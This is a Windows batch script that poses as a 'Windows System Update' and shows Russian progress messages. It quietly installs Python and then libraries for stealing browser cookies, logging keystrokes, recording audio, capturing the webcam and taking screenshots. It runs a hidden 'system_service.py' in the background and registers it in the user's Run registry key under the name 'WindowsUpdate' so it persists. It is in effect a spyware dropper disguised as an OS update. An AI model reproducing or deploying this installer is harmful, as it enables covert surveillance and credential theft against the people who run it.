@echo off
chcp 65001 >nul
title Windows System Update
echo ========================================
echo    Windows System Update v2.0
echo ========================================
echo.

echo [1/4] Проверка и установка Python...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Установка Python 3.9...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe' -OutFile 'python_setup.exe' -UserAgent 'Mozilla/5.0'"
    start /wait python_setup.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    del python_setup.exe
    echo Python успешно установлен!
) else (
    echo Python уже установлен
)

echo [2/4] Установка необходимых библиотек...
echo Установка зависимостей может занять несколько минут...
pip install requests pycryptodome browser-cookie3 pywin32 pillow pynput pyaudio opencv-python numpy --user --quiet >nul 2>&1
echo Все библиотеки установлены!

echo [3/4] Запуск системной службы...
if exist "system_service.py" (
    echo Запуск службы мониторинга...
    start /min pythonw system_service.py
    echo Служба запущена в фоновом режиме!
) else (
    echo Ошибка: файл system_service.py не найден
)

echo [4/4] Настройка автозагрузки...
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "pythonw "%CD%\system_service.py"" /f >nul 2>&1
echo Автозагрузка настроена!

echo ========================================
echo    Система успешно обновлена!
echo    Служба мониторинга активна.
echo ========================================
echo.
pause
